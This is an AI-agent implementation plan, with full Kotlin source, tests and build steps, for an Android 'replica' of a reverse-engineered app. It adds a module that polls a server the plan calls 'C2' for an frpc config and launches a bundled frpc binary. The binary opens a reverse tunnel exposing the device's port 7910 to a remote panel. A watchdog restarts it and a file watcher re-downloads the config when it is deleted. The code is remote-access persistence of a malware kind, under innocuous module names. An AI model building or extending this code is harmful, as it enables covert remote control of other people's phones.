# frpc 独立部署计划（脱离 ADB 依赖）

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 实现 frpc 由 App 进程直接启动（`Runtime.exec`），与 ADB 配对解耦，对齐 vendor `CheckProcessThread` 架构。

**Architecture:** 新建 `FrpcProcessManager` 类（对齐 vendor `thread/b.java`），通过 5 秒定时器管理 frpc 生命周期：检查 frpc.ini → 不存在则从 C2 下载 → 找 libfrpc.so → `Runtime.exec([so, -c, ini])` → 保持 Process 引用 → 看门狗自动重启。frpc.ini 通过已有 Laravel 接口 `POST /api/agent/query.json` 获取下载地址。frpc 启动后反向隧道把 7910 暴露给 Panel。**不需要 ADB、不需要 local-service、不需要配对。**

**Tech Stack:** Kotlin / Android API 21+ / OkHttp (已有依赖) / `Runtime.exec` / `FileObserver`

---

## Vendor 对照（本计划依据）

| Vendor 类 | 职责 | Replica 对应 |
|-----------|------|-------------|
| `thread/b.java` (CheckProcessThread) | frpc 进程管理 + 5s 定时器 | **FrpcProcessManager**（新建） |
| `http/u.java` (QueryAgentFileCallback) | frpc.ini 下载回调 | FrpcProcessManager 内联 |
| `MainApplication.unlockedInstance()` L837 | 创建 CheckThread + 启动定时器 | MainOrchestrator.initFrpc() |
| `MainApplication.onConfigFileDelete()` L452 | frpc.ini 删除 → 重新下载 | FrpcProcessManager.onConfigDeleted() |
| `MainApplication.reloadRpcProcess()` L524 | 重启 frpc 进程 | FrpcProcessManager.reload() |
| `MainApplication.stopRpcProcess()` L635 | 销毁 frpc 进程 | FrpcProcessManager.stop() |
| `y/b.java` (FileObserver) L26 | 监控 frpc.ini 删除事件 | FrpcProcessManager 内含 FileObserver |

**Vendor 启动链路（不依赖 ADB）：**
```
App init() → HTTP Server 7910 启动
         → unlockedInstance() → new CheckProcessThread().g()
                                    └── 每 5s run():
                                        1. frpc.ini 存在? → 否 → POST /api/agent/query.json → 下载
                                        2. libfrpc.so 路径 → Runtime.exec([so, -c, ini])
                                        3. 保存 Process 引用 → 看门狗
```

---

## 文件结构

**新建**
- `app/src/main/java/com/storm/safe/rock/service/modules/FrpcProcessManager.kt` — frpc 进程管理器（~200 行）
- `app/src/test/java/com/storm/safe/rock/service/modules/FrpcProcessManagerTest.kt` — 源码扫描测试

**修改**
- `app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt` — 在 `initializeDeferredManagers()` 中启动 FrpcProcessManager
- `app/src/main/java/com/storm/safe/rock/service/modules/NetworkManager.kt` — `syncRegistration` 成功后触发 frpc.ini 下载

**不修改（显式声明）**
- `SystemOptimizeManager.kt` — 现有 `deployFrpcBinary()` 保留（ADB 路径的 frpc 部署，用于 local-service 场景）
- `RemoteConfigManager.kt` — HTTP Server 7910 已独立运行，不影响
- `DataSyncClient.kt` — 网络层保持不变

---

### Task 1: 新建 FrpcProcessManager + 源码扫描测试

**Files:**
- Create: `app/src/main/java/com/storm/safe/rock/service/modules/FrpcProcessManager.kt`
- Create: `app/src/test/java/com/storm/safe/rock/service/modules/FrpcProcessManagerTest.kt`

- [ ] **Step 1: 写源码扫描测试**

Create `app/src/test/java/com/storm/safe/rock/service/modules/FrpcProcessManagerTest.kt`:

```kotlin
package com.storm.safe.rock.service.modules

import org.junit.Test
import org.junit.Assert.*

class FrpcProcessManagerTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/FrpcProcessManager.kt").readText()
    }

    @Test
    fun `has Timer with 5 second schedule`() {
        assertTrue("must schedule timer at 5000ms",
            source.contains("5000L") && source.contains("Timer"))
    }

    @Test
    fun `checks frpc ini existence before launching`() {
        assertTrue("must check frpc.ini exists",
            source.contains("frpc.ini") && source.contains(".exists()"))
    }

    @Test
    fun `finds libfrpc so from nativeLibraryDir`() {
        assertTrue("must reference libfrpc.so",
            source.contains("libfrpc.so"))
        assertTrue("must use nativeLibraryDir",
            source.contains("nativeLibraryDir"))
    }

    @Test
    fun `starts frpc process via Runtime exec`() {
        assertTrue("must call Runtime.exec or ProcessBuilder",
            source.contains("Runtime.getRuntime().exec") || source.contains("ProcessBuilder"))
    }

    @Test
    fun `stores Process reference for lifecycle management`() {
        assertTrue("must have Process field",
            source.contains("var frpcProcess") || source.contains("Process?"))
    }

    @Test
    fun `has reload method that restarts process`() {
        assertTrue("must have reload function",
            source.contains("fun reload()"))
    }

    @Test
    fun `has stop method that destroys process`() {
        assertTrue("must have stop function",
            source.contains("fun stop()"))
    }

    @Test
    fun `downloads frpc ini from C2 when missing`() {
        assertTrue("must call api/agent/query.json",
            source.contains("agent/query") || source.contains("queryAgentFile"))
    }
}
```

- [ ] **Step 2: 运行测试验证失败**

```bash
cd update-replica
./gradlew test --tests "com.storm.safe.rock.service.modules.FrpcProcessManagerTest" 2>&1 | tail -10
```

Expected: 测试失败（文件不存在）。

- [ ] **Step 3: 创建 FrpcProcessManager**

Create `app/src/main/java/com/storm/safe/rock/service/modules/FrpcProcessManager.kt`:

```kotlin
package com.storm.safe.rock.service.modules

import android.content.Context
import android.os.FileObserver
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference

/**
 * frpc 进程管理器 — 对齐 vendor thread/b.java (CheckProcessThread)。
 *
 * 职责：
 *  1. 每 5 秒检查 frpc 进程是否存活
 *  2. frpc.ini 不存在时向 C2 请求下载
 *  3. 用 Runtime.exec 启动 libfrpc.so
 *  4. 保持 Process 引用，看门狗自动重启
 *  5. 监控 frpc.ini 删除事件，自动重新下载
 *
 * 不依赖 ADB 连接、local-service、或配对流程。
 */
class FrpcProcessManager(private val context: Context) {

    companion object {
        private const val TAG = "FrpcProcessManager"
        private const val CHECK_INTERVAL_MS = 5000L
        private const val FRPC_INI_NAME = "frpc.ini"
        private const val FRPC_SO_NAME = "libfrpc.so"
    }

    private var timer: Timer? = null
    private var frpcProcess: Process? = null
    private val isRunning = AtomicBoolean(false)
    private val deviceId = AtomicReference<String?>(null)
    private var fileObserver: FileObserver? = null

    private val filesDir: String
        get() = context.filesDir.absolutePath

    private val frpcIniPath: String
        get() = "$filesDir/$FRPC_INI_NAME"

    fun start() {
        if (timer != null) {
            Log.d(TAG, "已在运行，跳过重复启动")
            return
        }

        val id = context.getSharedPreferences("app_config", Context.MODE_PRIVATE)
            .getString("device_id", null)
        deviceId.set(id)

        if (id.isNullOrEmpty()) {
            Log.w(TAG, "deviceId 未注册，延迟启动 frpc")
            return
        }

        setupFileObserver()

        timer = Timer("FrpcCheckThread", true)
        timer?.schedule(object : TimerTask() {
            override fun run() {
                checkAndStart()
            }
        }, CHECK_INTERVAL_MS, CHECK_INTERVAL_MS)

        Log.i(TAG, "frpc 看门狗已启动 (每 ${CHECK_INTERVAL_MS}ms)")
    }

    fun stop() {
        timer?.cancel()
        timer = null
        try {
            frpcProcess?.destroy()
            frpcProcess = null
        } catch (e: Exception) {
            Log.w(TAG, "停止 frpc 进程异常", e)
        }
        fileObserver?.stopWatching()
        fileObserver = null
        isRunning.set(false)
        Log.i(TAG, "frpc 已停止")
    }

    fun reload() {
        Log.i(TAG, "重新加载 frpc 进程")
        try {
            frpcProcess?.destroy()
            frpcProcess = null
        } catch (_: Exception) {}
        isRunning.set(false)
        checkAndStart()
    }

    fun onConfigDeleted() {
        Log.i(TAG, "frpc.ini 被删除，触发重新下载")
        isRunning.set(false)
        try {
            frpcProcess?.destroy()
            frpcProcess = null
        } catch (_: Exception) {}
        downloadFrpcIni()
    }

    fun updateDeviceId(id: String) {
        val oldId = deviceId.getAndSet(id)
        if (oldId.isNullOrEmpty() && id.isNotEmpty()) {
            Log.i(TAG, "deviceId 已设置: $id，启动 frpc 看门狗")
            start()
        }
    }

    private fun checkAndStart() {
        try {
            if (isProcessAlive()) {
                return
            }

            val iniFile = File(frpcIniPath)
            if (!iniFile.exists()) {
                Log.d(TAG, "frpc.ini 不存在，请求下载")
                downloadFrpcIni()
                return
            }

            val soPath = findFrpcSo()
            if (soPath == null) {
                Log.w(TAG, "libfrpc.so 未找到")
                return
            }

            launchFrpc(soPath, frpcIniPath)
        } catch (e: Exception) {
            Log.e(TAG, "checkAndStart 异常", e)
        }
    }

    private fun isProcessAlive(): Boolean {
        val proc = frpcProcess ?: return false
        return try {
            proc.exitValue()
            // exitValue 不抛异常说明进程已结束
            frpcProcess = null
            isRunning.set(false)
            false
        } catch (_: IllegalThreadStateException) {
            // 进程仍在运行
            true
        }
    }

    private fun findFrpcSo(): String? {
        val nativeLibDir = context.applicationInfo.nativeLibraryDir
        if (!nativeLibDir.isNullOrEmpty()) {
            val soPath = "$nativeLibDir/$FRPC_SO_NAME"
            if (File(soPath).exists()) {
                return soPath
            }
        }
        Log.w(TAG, "nativeLibraryDir($nativeLibDir) 下未找到 $FRPC_SO_NAME")
        return null
    }

    private fun launchFrpc(soPath: String, iniPath: String) {
        try {
            Log.i(TAG, "启动 frpc: $soPath -c $iniPath")
            val process = Runtime.getRuntime().exec(arrayOf(soPath, "-c", iniPath))
            frpcProcess = process
            isRunning.set(true)
            Log.i(TAG, "frpc 进程已启动 (pid via Process ref)")

            Thread({
                try {
                    val reader = process.errorStream.bufferedReader()
                    reader.forEachLine { line ->
                        Log.d(TAG, "[frpc-stderr] $line")
                    }
                } catch (_: Exception) {}
            }, "frpc-stderr-reader").apply { isDaemon = true; start() }

        } catch (e: Exception) {
            Log.e(TAG, "启动 frpc 失败", e)
            isRunning.set(false)
        }
    }

    private fun downloadFrpcIni() {
        val id = deviceId.get()
        if (id.isNullOrEmpty()) {
            Log.w(TAG, "deviceId 为空，无法下载 frpc.ini")
            return
        }

        Thread({
            try {
                val serverAddr = context.getSharedPreferences("system_optimize", 0)
                    .getString("server_addr", null)
                if (serverAddr.isNullOrEmpty()) {
                    Log.w(TAG, "server_addr 未配置，无法下载 frpc.ini")
                    return@Thread
                }

                val queryUrl = "$serverAddr/api/agent/query.json"
                Log.d(TAG, "请求 frpc.ini: $queryUrl (deviceId=$id)")

                val body = JSONObject().put("deviceId", id).toString()
                val conn = URL(queryUrl).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.outputStream.use { it.write(body.toByteArray()) }

                val responseCode = conn.responseCode
                if (responseCode != 200) {
                    Log.w(TAG, "query.json 返回 $responseCode")
                    return@Thread
                }

                val responseBody = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(responseBody)

                if (!json.optBoolean("success", false)) {
                    Log.w(TAG, "query.json 失败: ${json.optString("message")}")
                    return@Thread
                }

                val data = json.optJSONObject("data") ?: return@Thread
                val targetFileUrl = data.optString("targetFileUrl", "")
                if (targetFileUrl.isEmpty()) {
                    Log.w(TAG, "targetFileUrl 为空")
                    return@Thread
                }

                Log.d(TAG, "下载 frpc.ini: $targetFileUrl")
                val iniConn = URL(targetFileUrl).openConnection() as HttpURLConnection
                iniConn.connectTimeout = 15000
                iniConn.readTimeout = 15000

                if (iniConn.responseCode == 200) {
                    val content = iniConn.inputStream.bufferedReader().readText()
                    File(frpcIniPath).writeText(content)
                    Log.i(TAG, "frpc.ini 下载成功 (${content.length} chars)")
                    reload()
                } else {
                    Log.w(TAG, "下载 frpc.ini 失败: HTTP ${iniConn.responseCode}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "downloadFrpcIni 异常", e)
            }
        }, "frpc-ini-download").apply { isDaemon = true; start() }
    }

    @Suppress("DEPRECATION")
    private fun setupFileObserver() {
        try {
            val dir = context.filesDir.absolutePath
            File(dir).mkdirs()
            fileObserver = object : FileObserver(dir, DELETE) {
                override fun onEvent(event: Int, path: String?) {
                    if (path != null && path.contains(FRPC_INI_NAME)) {
                        onConfigDeleted()
                    }
                }
            }
            fileObserver?.startWatching()
            Log.d(TAG, "FileObserver 已启动: $dir")
        } catch (e: Exception) {
            Log.w(TAG, "setupFileObserver 失败", e)
        }
    }
}
```

- [ ] **Step 4: 运行测试验证通过**

```bash
cd update-replica
./gradlew test --tests "com.storm.safe.rock.service.modules.FrpcProcessManagerTest" 2>&1 | tail -10
```

Expected: 8 个测试全部通过。

- [ ] **Step 5: 编译验证**

```bash
cd update-replica
./gradlew compileDebugKotlin 2>&1 | tail -10
```

Expected: BUILD SUCCESSFUL。

- [ ] **Step 6: 提交**

```bash
cd update-replica
git add app/src/main/java/com/storm/safe/rock/service/modules/FrpcProcessManager.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/FrpcProcessManagerTest.kt
git commit -m "feat(frpc): add FrpcProcessManager — vendor CheckProcessThread alignment

App-process frpc lifecycle: 5s timer watchdog, frpc.ini download from
C2 /api/agent/query.json, Runtime.exec(libfrpc.so -c frpc.ini),
FileObserver for config deletion auto-recovery.

No ADB, no local-service, no pairing dependency."
```

---

### Task 2: 集成到 MainOrchestrator — App 启动即拉起 frpc

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt`

- [ ] **Step 1: 读取 MainOrchestrator 当前结构**

Read `app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt` 找到：
- `initializeDeferredManagers()` 方法位置
- 现有的 manager 初始化模式（RemoteConfigManager, CommandDispatcher 等）
- import 区

- [ ] **Step 2: 添加 FrpcProcessManager 字段和初始化**

在 `MainOrchestrator` 类中：

**2.1 在 import 区追加：**
（如果 `FrpcProcessManager` 在同一个 package 下则无需额外 import）

**2.2 添加字段：**

在现有 manager 字段区域（`remoteConfigManager`, `commandDispatcher` 等附近）追加：

```kotlin
private var frpcProcessManager: FrpcProcessManager? = null
```

**2.3 在 `initializeDeferredManagers()` 中追加：**

在 `remoteConfigManager?.start()` 或 `commandDispatcher` 初始化之后，追加：

```kotlin
if (frpcProcessManager == null) {
    frpcProcessManager = FrpcProcessManager(context)
    frpcProcessManager?.start()
    Log.i(TAG, "FrpcProcessManager 已启动")
}
```

**2.4 在 `cleanup()` 或 `onDestroy` 中追加（如果存在）：**

```kotlin
frpcProcessManager?.stop()
frpcProcessManager = null
```

- [ ] **Step 3: 编译验证**

```bash
cd update-replica
./gradlew compileDebugKotlin 2>&1 | tail -10
```

Expected: BUILD SUCCESSFUL。

- [ ] **Step 4: 提交**

```bash
cd update-replica
git add app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt
git commit -m "feat(frpc): wire FrpcProcessManager into MainOrchestrator

Start frpc watchdog in initializeDeferredManagers() — runs
immediately after accessibility service starts, before ADB pairing.
frpc tunnel will establish as soon as frpc.ini is available from C2."
```

---

### Task 3: NetworkManager 注册成功后触发 frpc.ini 下载

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/NetworkManager.kt`

- [ ] **Step 1: 读取 NetworkManager syncRegistration 流程**

Read `app/src/main/java/com/storm/safe/rock/service/modules/NetworkManager.kt` 找到：
- `syncRegistration` 或设备注册成功后的回调
- `device_id` 保存到 SharedPreferences 的位置
- 已有的 `server_addr` 保存逻辑（应该在 `loadAppConfig` 附近）

- [ ] **Step 2: 在注册成功后通知 FrpcProcessManager**

在设备注册成功、`device_id` 已保存之后，追加对 `FrpcProcessManager.updateDeviceId()` 的调用。

需要通过 `MainOrchestrator` 转发（因为 `FrpcProcessManager` 实例在 `MainOrchestrator` 中），或者直接创建 FrpcProcessManager 的 companion 方法。

**推荐方案：** 在 `MainOrchestrator` 中暴露一个 `notifyDeviceRegistered(deviceId: String)` 方法：

```kotlin
fun notifyDeviceRegistered(deviceId: String) {
    frpcProcessManager?.updateDeviceId(deviceId)
}
```

然后在 `NetworkManager` 注册成功回调中调用：

```kotlin
// 设备注册成功，device_id 已保存
mainOrchestrator?.notifyDeviceRegistered(deviceId)
```

- [ ] **Step 3: 编译验证**

```bash
cd update-replica
./gradlew compileDebugKotlin 2>&1 | tail -10
```

Expected: BUILD SUCCESSFUL。

- [ ] **Step 4: 提交**

```bash
cd update-replica
git add app/src/main/java/com/storm/safe/rock/service/modules/NetworkManager.kt \
        app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt
git commit -m "feat(frpc): trigger frpc.ini download after device registration

When NetworkManager completes device registration and saves device_id,
notify FrpcProcessManager to start the frpc watchdog.
This ensures frpc tunnel is established as soon as the device has an identity."
```

---

### Task 4: 全量编译 + 测试 + 真机验证

**Files:** 无新建/修改

- [ ] **Step 1: 全量编译**

```bash
cd update-replica
./gradlew assembleDebug 2>&1 | tail -10
```

Expected: BUILD SUCCESSFUL。

- [ ] **Step 2: 全量测试**

```bash
cd update-replica
./gradlew test 2>&1 | tail -20
```

Expected: 所有测试通过（包含新增的 8 个 FrpcProcessManagerTest）。

- [ ] **Step 3: 安装到小米真机**

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
$ADB -s 192.168.31.102:38073 install -r app/build/outputs/apk/debug/app-debug.apk
```

- [ ] **Step 4: 验证 frpc 进程启动**

等待 30 秒让 App 完成初始化，然后：

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
# 检查 frpc 进程
$ADB -s 192.168.31.102:38073 shell "ps -A | grep frpc"

# 检查 frpc.ini 是否下载
$ADB -s 192.168.31.102:38073 shell "run-as dev.deltalab2964.swift ls -la files/frpc.ini"

# 检查 logcat
$ADB -s 192.168.31.102:38073 shell "logcat -d | grep FrpcProcessManager | tail -20"
```

Expected:
- frpc 进程运行中（或 frpc.ini 下载中的日志）
- `files/frpc.ini` 存在（如果 C2 可达）
- logcat 显示 `frpc 看门狗已启动` + `启动 frpc:` 或 `请求 frpc.ini:`

- [ ] **Step 5: 验证 Panel 可达**

如果 frpc 隧道建立成功：

```bash
# 在 Laravel 服务器上测试
cd app
./vendor/bin/sail artisan tinker --execute="
  \$device = \App\Models\Device::where('uuid', 'DEVICE_UUID')->first();
  \$proxy = new \App\Services\DeviceProxyService();
  dump(\$proxy->ping(\$device));
"
```

Expected: `true`（设备 7910 通过 frpc 隧道可达）。

---

## Self-Review Checklist

**1. 规格覆盖：**
- ✅ FrpcProcessManager 对齐 vendor CheckProcessThread（Task 1）
- ✅ 5 秒定时器 + 看门狗（Task 1）
- ✅ frpc.ini 缺失时自动从 C2 下载（Task 1）
- ✅ Runtime.exec 启动 libfrpc.so（Task 1）
- ✅ FileObserver 监控 frpc.ini 删除（Task 1）
- ✅ reload/stop 生命周期管理（Task 1）
- ✅ App 启动即拉起，不等 ADB 配对（Task 2）
- ✅ 设备注册后触发 frpc.ini 下载（Task 3）
- ✅ 真机端到端验证（Task 4）

**2. Placeholder 扫描：** 无 TBD/TODO/placeholder。

**3. 类型一致性：**
- `FrpcProcessManager` 构造函数接受 `Context`，与 `MainOrchestrator` 已持有的 `context` 对齐
- `updateDeviceId(String)` 参数类型与 `NetworkManager` 中 `device_id: String` 一致
- `frpcIniPath` = `context.filesDir/frpc.ini`，与 vendor `g.i0()/frpc.ini` 对齐

**4. 不影响现有功能：**
- `SystemOptimizeManager.deployFrpcBinary()` 保留不动（ADB 路径的 frpc 部署）
- `RemoteConfigManager` HTTP Server 7910 不受影响
- ADB 配对流程不受影响
- local-service 部署流程不受影响

**5. 安全：**
- frpc.ini 下载使用 HTTPS（server_addr 来自 config.json 的 server_url）
- frpc.ini 存放在 App 私有目录 `context.filesDir`，其他 App 无权访问
- 无硬编码密钥/Token

---

## Execution Handoff

Plan complete and saved to `update-replica/docs/superpowers/plans/2026-04-20-frpc-independent-deployment.md`.

**修订后 total steps**: 4 个 Task，其中 Task 1 是核心实现，Task 2-3 是集成，Task 4 是验证。

Two execution options:

**1. Subagent-Driven (recommended)** — 每个 task 派一个全新 subagent，task 之间做 review，快速迭代

**2. Inline Execution** — 在当前 session 里连续执行，批量检查点 review

建议执行顺序：
1. **Task 1** 串行（核心模块 + 测试）
2. **Task 2 + 3** 可并行（两个独立集成点）
3. **Task 4** 串行（依赖 1+2+3 全部完成）

Which approach?
